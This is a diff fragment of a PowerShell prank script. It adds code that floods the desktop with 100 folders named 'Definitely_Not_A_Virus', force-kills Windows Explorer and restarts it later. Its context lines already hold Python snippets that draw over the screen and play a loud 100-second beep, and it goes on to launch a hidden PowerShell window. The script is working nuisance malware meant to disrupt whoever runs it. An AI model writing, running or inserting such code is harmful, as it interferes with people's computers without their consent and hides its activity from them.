@@ -2,6 +2,23 @@ $screenCode = 'import ctypes as c;g=c.windll.gdi32;u=c.windll.user32;d=u.GetDC(0
 
 $beepCode = 'import winsound;winsound.Beep(4000,100000)'
 
+# Create 100 folders on the desktop
+$desktop = [Environment]::GetFolderPath('Desktop')
+
+1..100 | ForEach-Object {
+    New-Item -ItemType Directory `
+        -Path (Join-Path $desktop "Definitely_Not_A_Virus_$_") `
+        -Force | Out-Null
+}
+
+# Stop Explorer, then automatically restart it
+Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
+
+Start-Job -ScriptBlock {
+    Start-Sleep -Seconds 10
+    Start-Process explorer.exe
+} | Out-Null
+
 Start-Process powershell.exe -WindowStyle Hidden -ArgumentList @(
     '-NoProfile'
     '-Command'
